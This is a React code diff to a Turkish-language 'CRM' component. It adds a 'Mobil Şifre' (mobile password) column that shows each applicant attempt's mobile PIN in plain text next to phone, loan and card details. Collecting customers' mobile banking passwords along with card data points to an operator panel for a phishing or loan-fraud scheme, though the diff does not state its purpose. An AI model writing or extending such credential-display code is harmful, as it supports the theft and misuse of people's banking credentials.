@@ -129,7 +129,7 @@ export function CrmAccordion({
                   )}
                 </div>
                 <div className="overflow-x-auto">
-                  <table className="w-full min-w-[640px] text-sm">
+                  <table className="w-full min-w-[720px] text-sm">
                     <thead>
                       <tr className="text-left text-xs text-gray-500">
                         <th className="pb-2 pr-3 font-medium">#</th>
@@ -138,6 +138,7 @@ export function CrmAccordion({
                         <th className="pb-2 pr-3 font-medium">Telefon</th>
                         <th className="pb-2 pr-3 font-medium">Kredi</th>
                         <th className="pb-2 pr-3 font-medium">Kart</th>
+                        <th className="pb-2 pr-3 font-medium">Mobil Şifre</th>
                         <th className="pb-2 font-medium">Tarih</th>
                       </tr>
                     </thead>
@@ -177,7 +178,7 @@ function AttemptRow({
     return (
       <tr className="border-t border-dashed border-gray-200 text-gray-400">
         <td className="py-2 pr-3">{attemptNumber}</td>
-        <td colSpan={6} className="py-2">
+        <td colSpan={7} className="py-2">
           Yapılmadı
         </td>
       </tr>
@@ -202,6 +203,9 @@ function AttemptRow({
         {formatCurrency(attempt.loanAmount)} / {attempt.loanTerm} ay
       </td>
       <td className="py-2 pr-3 font-mono text-xs">{cardLabel}</td>
+      <td className="py-2 pr-3 font-mono text-xs">
+        {attempt.mobilePin || "—"}
+      </td>
       <td className="py-2 text-xs text-gray-500">
         {new Date(attempt.createdAt).toLocaleString("tr-TR")}
       </td>
